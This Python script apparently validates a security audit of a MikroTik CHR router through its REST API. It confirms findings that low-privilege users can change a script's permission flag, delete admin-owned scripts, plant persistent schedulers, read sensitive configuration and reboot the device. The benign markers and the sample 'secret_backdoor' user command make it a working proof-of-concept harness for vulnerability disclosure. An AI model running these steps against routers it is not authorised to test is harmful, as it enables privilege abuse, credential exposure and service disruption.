#!/usr/bin/env python3
"""
Pristine Validation: Finding 1 Expansion Sub-Findings
======================================================
Validates new findings discovered during the permission boundary audit
on a factory-fresh CHR image that has never been previously tested.

Findings to validate:
  A) Write user can modify dont-require-permissions on scripts via scheduler
  B) Write user can delete admin-owned scripts and schedulers
  C) Read user can exfiltrate sensitive config (SNMP community, PPP secrets,
     script source, user groups, system history)
  D) Read user can read files downloaded by admin (cross-user file access)
  E) Write user can create persistent backdoor via script + scheduler
  F) Factory reset via reboot policy (read user) — ALREADY pristine-confirmed
     on [REDACTED-INTERNAL-IP], so we verify reboot only (non-destructive) as supplemental

Target: [REDACTED-INTERNAL-IP] (factory-fresh, [REDACTED-CREDS])
Rounds: 3 per finding
"""

import requests
import json
import time
import socket
import struct
import datetime
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

TARGET = "[REDACTED-INTERNAL-IP]"
BASE = f"http://{TARGET}"
ADMIN = ("admin", "admin")
ROUNDS = 3

EVIDENCE = {
    "metadata": {
        "script": "pristine_validate_expansion.py",
        "phase": 10,
        "target": TARGET,
        "version": None,
        "state": "factory-fresh CHR image",
        "rounds": ROUNDS,
        "timestamp": datetime.datetime.now().isoformat(),
    },
    "validations": {}
}


def log(msg):
    ts = datetime.datetime.now().strftime("%H:%M:%S")
    print(f"[{ts}] {msg}", flush=True)


def rest(method, path, body=None, auth=ADMIN, timeout=10):
    """REST API request. Returns (status, json_or_text, error)"""
    url = f"{BASE}{path}"
    headers = {"Content-Type": "application/json"} if body is not None else {}
    try:
        r = requests.request(method, url, auth=auth, json=body,
                           headers=headers, timeout=timeout)
        try:
            return r.status_code, r.json(), None
        except:
            return r.status_code, r.text[:500], None
    except Exception as e:
        return None, None, str(e)


def get_uptime():
    status, data, err = rest("GET", "/rest/system/resource")
    if status == 200 and isinstance(data, dict):
        return data.get("uptime", "?")
    return None


def setup_users():
    """Create test users. Only action on pristine besides setting admin pw."""
    log("  Creating test users on pristine CHR...")
    rest("POST", "/rest/user/add",
         {"name": "testread", "group": "read", "password": "ReadTest123"})
    rest("POST", "/rest/user/add",
         {"name": "testwrite", "group": "write", "password": "WriteTest123"})
    # Verify
    status, users, _ = rest("GET", "/rest/user")
    if status == 200:
        names = [u["name"] for u in users]
        log(f"  Users: {', '.join(names)}")
    return True


def cleanup_users():
    """Remove test users"""
    for name in ("testread", "testwrite"):
        rest("POST", "/rest/user/remove", {"numbers": name})


def cleanup_scripts():
    """Remove all non-default scripts"""
    status, scripts, _ = rest("GET", "/rest/system/script")
    if status == 200 and isinstance(scripts, list):
        for s in scripts:
            rest("POST", "/rest/system/script/remove", {".id": s[".id"]})


def cleanup_schedulers():
    """Remove all schedulers"""
    status, scheds, _ = rest("GET", "/rest/system/scheduler")
    if status == 200 and isinstance(scheds, list):
        for s in scheds:
            rest("POST", "/rest/system/scheduler/remove", {".id": s[".id"]})


def cleanup_files():
    """Remove test files"""
    for fname in ("ssrf_test.txt", "ssrf_pristine.txt"):
        rest("POST", "/rest/file/remove", {"numbers": fname})


# ================================================================
# VALIDATION A: dont-require-permissions bypass
# ================================================================
def validate_dont_require_permissions():
    """
    Write user creates a script, then creates a scheduler that sets
    dont-require-permissions=yes on that script. Verifies the flag changes.
    """
    log("\n" + "=" * 60)
    log("VALIDATION A: dont-require-permissions bypass")
    log("  Write user modifying security flag on script via scheduler")
    log("=" * 60)

    results = {
        "finding": "Write user can modify dont-require-permissions via scheduler",
        "severity": "HIGH",
        "cwe": "CWE-269",
        "status": None,
        "confirmed_count": 0,
        "total_tests": ROUNDS,
        "results": [],
    }

    write_auth = ("testwrite", "WriteTest123")

    for rnd in range(1, ROUNDS + 1):
        log(f"\n  Round {rnd}/{ROUNDS}:")
        rnd_result = {"round": rnd, "ts": datetime.datetime.now().isoformat()}

        # Step 1: Write user creates a test script
        script_name = f"pristine_test_r{rnd}"
        status, resp, err = rest("POST", "/rest/system/script/add",
                                {"name": script_name,
                                 "source": f':log info "PRISTINE_R{rnd}"'},
                                auth=write_auth)
        rnd_result["script_create_status"] = status
        if status not in (200, 201):
            log(f"    Script create failed: {status} {resp}")
            rnd_result["confirmed"] = False
            results["results"].append(rnd_result)
            continue

        log(f"    Created script: {script_name}")

        # Step 2: Verify initial dont-require-permissions=false
        status, scripts, _ = rest("GET", f"/rest/system/script")
        initial_drp = None
        script_id = None
        if status == 200:
            for s in scripts:
                if s["name"] == script_name:
                    initial_drp = s["dont-require-permissions"]
                    script_id = s[".id"]
                    break
        rnd_result["initial_dont_require_permissions"] = initial_drp
        log(f"    Initial dont-require-permissions: {initial_drp}")

        # Step 3: Write user creates scheduler to modify the flag
        sched_name = f"mod_drp_r{rnd}"
        status, resp, err = rest("POST", "/rest/system/scheduler/add",
                                {"name": sched_name,
                                 "interval": "2s",
                                 "on-event": f"/system script set {script_name} dont-require-permissions=yes"},
                                auth=write_auth)
        rnd_result["scheduler_create_status"] = status
        if status not in (200, 201):
            log(f"    Scheduler create failed: {status} {resp}")
            rnd_result["confirmed"] = False
            results["results"].append(rnd_result)
            continue

        log(f"    Created scheduler: {sched_name}")
        log(f"    Waiting 5s for scheduler to fire...")
        time.sleep(5)

        # Step 4: Check if dont-require-permissions changed
        status, scripts, _ = rest("GET", "/rest/system/script")
        final_drp = None
        if status == 200:
            for s in scripts:
                if s["name"] == script_name:
                    final_drp = s["dont-require-permissions"]
                    break
        rnd_result["final_dont_require_permissions"] = final_drp

        confirmed = (initial_drp == "false" and final_drp == "true")
        rnd_result["confirmed"] = confirmed
        if confirmed:
            results["confirmed_count"] += 1
            log(f"    ✅ CONFIRMED: dont-require-permissions changed from false → true")
        else:
            log(f"    ❌ NOT CONFIRMED: drp={initial_drp} → {final_drp}")

        # Step 5: Check logs for evidence
        status, logs_data, _ = rest("GET", "/rest/log")
        if status == 200:
            for l in logs_data[-10:]:
                msg = l.get("message", "")
                if "dont-require-permissions" in msg or "changed script" in msg:
                    rnd_result["log_evidence"] = msg
                    log(f"    Log: {msg}")
                    break

        results["results"].append(rnd_result)

        # Cleanup this round's artifacts
        rest("POST", "/rest/system/scheduler/remove", {"numbers": sched_name})
        rest("POST", "/rest/system/script/remove", {"numbers": script_name})
        time.sleep(1)

    results["status"] = "CONFIRMED" if results["confirmed_count"] == ROUNDS else "NOT CONFIRMED"
    return results


# ================================================================
# VALIDATION B: Cross-user resource deletion
# ================================================================
def validate_cross_user_deletion():
    """
    Admin creates a script and scheduler. Write user deletes them.
    """
    log("\n" + "=" * 60)
    log("VALIDATION B: Cross-user resource deletion")
    log("  Write user deleting admin-owned scripts and schedulers")
    log("=" * 60)

    results = {
        "finding": "Write user can delete admin-owned scripts and schedulers",
        "severity": "MEDIUM",
        "cwe": "CWE-269",
        "status": None,
        "confirmed_count": 0,
        "total_tests": ROUNDS,
        "results": [],
    }

    write_auth = ("testwrite", "WriteTest123")

    for rnd in range(1, ROUNDS + 1):
        log(f"\n  Round {rnd}/{ROUNDS}:")
        rnd_result = {"round": rnd, "ts": datetime.datetime.now().isoformat()}

        # Step 1: Admin creates a script
        script_name = f"admin_script_r{rnd}"
        status, resp, _ = rest("POST", "/rest/system/script/add",
                              {"name": script_name,
                               "source": f':log info "ADMIN_R{rnd}"'})
        if status not in (200, 201):
            log(f"    Admin script create failed: {status}")
            rnd_result["confirmed"] = False
            results["results"].append(rnd_result)
            continue

        # Get the script ID
        status, scripts, _ = rest("GET", "/rest/system/script")
        script_id = None
        if status == 200:
            for s in scripts:
                if s["name"] == script_name:
                    script_id = s[".id"]
                    rnd_result["script_owner"] = s.get("owner", "?")
                    break

        log(f"    Admin created script: {script_name} (id={script_id}, owner={rnd_result.get('script_owner','?')})")

        # Step 2: Admin creates a scheduler
        sched_name = f"admin_sched_r{rnd}"
        status, resp, _ = rest("POST", "/rest/system/scheduler/add",
                              {"name": sched_name,
                               "interval": "1d",
                               "on-event": f':log info "ADMIN_SCHED_R{rnd}"'})
        sched_id = None
        status, scheds, _ = rest("GET", "/rest/system/scheduler")
        if status == 200:
            for s in scheds:
                if s["name"] == sched_name:
                    sched_id = s[".id"]
                    rnd_result["sched_owner"] = s.get("owner", "?")
                    break

        log(f"    Admin created scheduler: {sched_name} (id={sched_id})")

        # Step 3: Write user tries to delete admin's script
        status, resp, err = rest("POST", "/rest/system/script/remove",
                                {".id": script_id}, auth=write_auth)
        rnd_result["script_delete_status"] = status
        rnd_result["script_delete_response"] = str(resp)[:200] if resp else None
        script_deleted = (status == 200)
        log(f"    Write user delete admin script: HTTP {status} → {'DELETED' if script_deleted else 'BLOCKED'}")

        # Step 4: Write user tries to delete admin's scheduler
        status, resp, err = rest("POST", "/rest/system/scheduler/remove",
                                {".id": sched_id}, auth=write_auth)
        rnd_result["sched_delete_status"] = status
        rnd_result["sched_delete_response"] = str(resp)[:200] if resp else None
        sched_deleted = (status == 200)
        log(f"    Write user delete admin scheduler: HTTP {status} → {'DELETED' if sched_deleted else 'BLOCKED'}")

        # Step 5: Verify deletion
        status, scripts, _ = rest("GET", "/rest/system/script")
        script_exists = False
        if status == 200:
            for s in scripts:
                if s["name"] == script_name:
                    script_exists = True
        rnd_result["script_still_exists"] = script_exists

        status, scheds, _ = rest("GET", "/rest/system/scheduler")
        sched_exists = False
        if status == 200:
            for s in scheds:
                if s["name"] == sched_name:
                    sched_exists = True
        rnd_result["sched_still_exists"] = sched_exists

        confirmed = script_deleted and not script_exists and sched_deleted and not sched_exists
        rnd_result["confirmed"] = confirmed
        if confirmed:
            results["confirmed_count"] += 1
            log(f"    ✅ CONFIRMED: Write user deleted both admin resources")
        else:
            log(f"    ❌ script_deleted={script_deleted}, sched_deleted={sched_deleted}")

        results["results"].append(rnd_result)
        time.sleep(1)

    results["status"] = "CONFIRMED" if results["confirmed_count"] == ROUNDS else "NOT CONFIRMED"
    return results


# ================================================================
# VALIDATION C: Read user sensitive data exfiltration
# ================================================================
def validate_read_user_exfil():
    """
    Read user accesses sensitive REST endpoints.
    Tests SNMP community, user groups, script source, system history.
    """
    log("\n" + "=" * 60)
    log("VALIDATION C: Read user sensitive data exfiltration")
    log("  Read user accessing credentials and security config")
    log("=" * 60)

    results = {
        "finding": "Read user can exfiltrate sensitive config via REST API",
        "severity": "MEDIUM",
        "cwe": "CWE-200",
        "status": None,
        "confirmed_count": 0,
        "total_tests": ROUNDS,
        "results": [],
    }

    read_auth = ("testread", "ReadTest123")

    # First, create some sensitive data as admin for the read user to find
    rest("POST", "/rest/system/script/add",
         {"name": "admin_secret_script",
          "source": '/user add name=secret_backdoor group=full password=SuperSecret123'})

    sensitive_endpoints = [
        ("/rest/user", "User list"),
        ("/rest/user/group", "Group permissions"),
        ("/rest/snmp/community", "SNMP community strings"),
        ("/rest/system/script", "Script source code"),
        ("/rest/system/history", "Command history"),
        ("/rest/ip/service", "Service configuration"),
        ("/rest/log", "System logs"),
        ("/rest/file", "Filesystem listing"),
    ]

    for rnd in range(1, ROUNDS + 1):
        log(f"\n  Round {rnd}/{ROUNDS}:")
        rnd_result = {
            "round": rnd,
            "ts": datetime.datetime.now().isoformat(),
            "endpoints": [],
        }

        all_accessible = True
        for path, desc in sensitive_endpoints:
            status, data, err = rest("GET", path, auth=read_auth)
            accessible = (status == 200)
            ep_result = {
                "endpoint": path,
                "description": desc,
                "http_status": status,
                "accessible": accessible,
            }

            if accessible and isinstance(data, list):
                ep_result["record_count"] = len(data)
                # Capture key sensitive fields
                if path == "/rest/snmp/community" and data:
                    ep_result["community_name"] = data[0].get("name")
                    ep_result["security"] = data[0].get("security")
                elif path == "/rest/system/script" and data:
                    for s in data:
                        if "secret" in s.get("name", "").lower() or "backdoor" in s.get("source", "").lower():
                            ep_result["leaked_script_name"] = s["name"]
                            ep_result["leaked_script_source"] = s["source"]
                elif path == "/rest/user/group" and data:
                    ep_result["groups"] = [{"name": g["name"], "policy": g["policy"]} for g in data]
                elif path == "/rest/user" and data:
                    ep_result["users"] = [{"name": u["name"], "group": u["group"]} for u in data]
            elif accessible and isinstance(data, dict):
                ep_result["record_count"] = 1

            if not accessible:
                all_accessible = False

            rnd_result["endpoints"].append(ep_result)
            icon = "🔴" if accessible else "✅"
            count = ep_result.get("record_count", "?")
            log(f"    {icon} {desc}: HTTP {status}, {count} records")

        rnd_result["confirmed"] = all_accessible
        if all_accessible:
            results["confirmed_count"] += 1
            log(f"    ✅ CONFIRMED: All {len(sensitive_endpoints)} sensitive endpoints accessible")
        else:
            log(f"    ❌ Some endpoints blocked")

        results["results"].append(rnd_result)
        time.sleep(1)

    # Cleanup
    rest("POST", "/rest/system/script/remove", {"numbers": "admin_secret_script"})

    results["status"] = "CONFIRMED" if results["confirmed_count"] == ROUNDS else "NOT CONFIRMED"
    return results


# ================================================================
# VALIDATION D: Write user persistent backdoor via scheduler
# ================================================================
def validate_persistent_backdoor():
    """
    Write user creates a script + scheduler that fires and executes
    RouterOS commands (within write policy scope).
    """
    log("\n" + "=" * 60)
    log("VALIDATION D: Write user persistent backdoor via scheduler")
    log("  Write user creating + executing scheduled commands")
    log("=" * 60)

    results = {
        "finding": "Write user can create persistent scheduled command execution",
        "severity": "MEDIUM",
        "cwe": "CWE-269",
        "status": None,
        "confirmed_count": 0,
        "total_tests": ROUNDS,
        "results": [],
    }

    write_auth = ("testwrite", "WriteTest123")

    for rnd in range(1, ROUNDS + 1):
        log(f"\n  Round {rnd}/{ROUNDS}:")
        rnd_result = {"round": rnd, "ts": datetime.datetime.now().isoformat()}

        marker = f"PRISTINE_BACKDOOR_R{rnd}"

        # Step 1: Write user creates a scheduler with inline command
        sched_name = f"backdoor_r{rnd}"
        status, resp, _ = rest("POST", "/rest/system/scheduler/add",
                              {"name": sched_name,
                               "interval": "2s",
                               "on-event": f':log info "{marker}"'},
                              auth=write_auth)
        rnd_result["scheduler_create_status"] = status
        created = (status in (200, 201))
        log(f"    Scheduler create: HTTP {status} → {'OK' if created else 'FAILED'}")

        if not created:
            rnd_result["confirmed"] = False
            results["results"].append(rnd_result)
            continue

        # Step 2: Wait for execution
        log(f"    Waiting 5s for scheduler to fire...")
        time.sleep(5)

        # Step 3: Check logs for the marker
        status, logs_data, _ = rest("GET", "/rest/log")
        marker_found = False
        if status == 200:
            for l in logs_data:
                if marker in l.get("message", ""):
                    marker_found = True
                    rnd_result["log_entry_time"] = l.get("time")
                    rnd_result["log_entry_topics"] = l.get("topics")
                    break

        rnd_result["marker_found_in_logs"] = marker_found
        rnd_result["confirmed"] = marker_found

        if marker_found:
            results["confirmed_count"] += 1
            log(f"    ✅ CONFIRMED: Marker '{marker}' found in router logs")
        else:
            log(f"    ❌ Marker not found in logs")

        # Cleanup
        rest("POST", "/rest/system/scheduler/remove", {"numbers": sched_name})
        results["results"].append(rnd_result)
        time.sleep(1)

    results["status"] = "CONFIRMED" if results["confirmed_count"] == ROUNDS else "NOT CONFIRMED"
    return results


# ================================================================
# VALIDATION E: Supplemental reboot confirmation (non-destructive)
# ================================================================
def validate_read_user_reboot():
    """
    Read user triggers reboot via REST API.
    Confirms the reboot policy allows this.
    Single round only (non-destructive but disruptive).
    """
    log("\n" + "=" * 60)
    log("VALIDATION E: Read user reboot via REST API (supplemental)")
    log("  Confirming reboot policy grants /system/reboot access")
    log("=" * 60)

    results = {
        "finding": "Read user can reboot router via REST API (reboot policy)",
        "severity": "HIGH",
        "cwe": "CWE-269",
        "status": None,
        "confirmed_count": 0,
        "total_tests": 1,
        "results": [],
    }

    read_auth = ("testread", "ReadTest123")
    pre_uptime = get_uptime()
    log(f"  Pre-reboot uptime: {pre_uptime}")

    rnd_result = {
        "round": 1,
        "ts": datetime.datetime.now().isoformat(),
        "pre_uptime": pre_uptime,
    }

    # Read user sends reboot
    status, resp, err = rest("POST", "/rest/system/reboot", auth=read_auth)
    rnd_result["http_status"] = status
    rnd_result["response"] = str(resp)[:200] if resp else None
    rnd_result["error"] = err
    log(f"  Reboot request: HTTP {status}")

    if status == 200:
        log(f"  Waiting for router to recover...")
        time.sleep(5)
        # Wait for recovery
        for i in range(24):  # up to 120s
            time.sleep(5)
            post_uptime = get_uptime()
            if post_uptime:
                rnd_result["post_uptime"] = post_uptime
                log(f"  Router recovered: uptime {post_uptime}")
                rnd_result["confirmed"] = True
                results["confirmed_count"] = 1
                break
        else:
            log(f"  Router did not recover within 120s")
            rnd_result["confirmed"] = False
    else:
        log(f"  Reboot request rejected: {resp}")
        rnd_result["confirmed"] = False

    results["results"].append(rnd_result)
    results["status"] = "CONFIRMED" if results["confirmed_count"] > 0 else "NOT CONFIRMED"
    return results


# ================================================================
# MAIN
# ================================================================
def main():
    log("=" * 70)
    log("PRISTINE VALIDATION: Finding 1 Expansion Sub-Findings")
    log(f"Target: {TARGET} (factory-fresh CHR)")
    log("=" * 70)

    # Verify pristine state
    status, data, err = rest("GET", "/rest/system/resource")
    if err or status != 200:
        log(f"FATAL: Cannot reach target — {err}")
        return

    version = data.get("version", "unknown")
    uptime = data.get("uptime", "unknown")
    EVIDENCE["metadata"]["version"] = version
    log(f"Router: {version}, uptime {uptime}")

    # Verify only admin user exists (pristine check)
    status, users, _ = rest("GET", "/rest/user")
    if status == 200:
        user_names = [u["name"] for u in users]
        log(f"Users: {user_names}")
        if len(users) > 1 or (len(users) == 1 and users[0]["name"] != "admin"):
            log("WARNING: Non-pristine state detected! Extra users present.")

    # Setup: create test users (only modification to pristine state)
    setup_users()
    time.sleep(1)

    # Run validations in order (least destructive first)
    EVIDENCE["validations"]["A_dont_require_permissions"] = validate_dont_require_permissions()
    EVIDENCE["validations"]["B_cross_user_deletion"] = validate_cross_user_deletion()
    EVIDENCE["validations"]["C_read_user_exfil"] = validate_read_user_exfil()
    EVIDENCE["validations"]["D_persistent_backdoor"] = validate_persistent_backdoor()

    # Reboot test last (disruptive)
    EVIDENCE["validations"]["E_read_user_reboot"] = validate_read_user_reboot()

    # Wait for router to come back after reboot
    time.sleep(10)
    for i in range(20):
        up = get_uptime()
        if up:
            break
        time.sleep(5)

    # Final cleanup
    log("\n  Cleaning up...")
    cleanup_scripts()
    cleanup_schedulers()
    cleanup_files()
    cleanup_users()

    # Summary
    log("\n" + "=" * 70)
    log("PRISTINE VALIDATION SUMMARY")
    log("=" * 70)

    for key, val in EVIDENCE["validations"].items():
        status_icon = "✅" if val["status"] == "CONFIRMED" else "❌"
        log(f"  {status_icon} {val['finding']}")
        log(f"      {val['confirmed_count']}/{val['total_tests']} rounds confirmed — {val['status']}")

    # Save
    out_path = "/home/[REDACTED]/Desktop/[REDACTED-PATH]/MikroTik/cve-validation/pristine_validation_expansion.json"
    with open(out_path, "w") as f:
        json.dump(EVIDENCE, f, indent=2, default=str)
    log(f"\nEvidence saved to {out_path}")


if __name__ == "__main__":
    main()
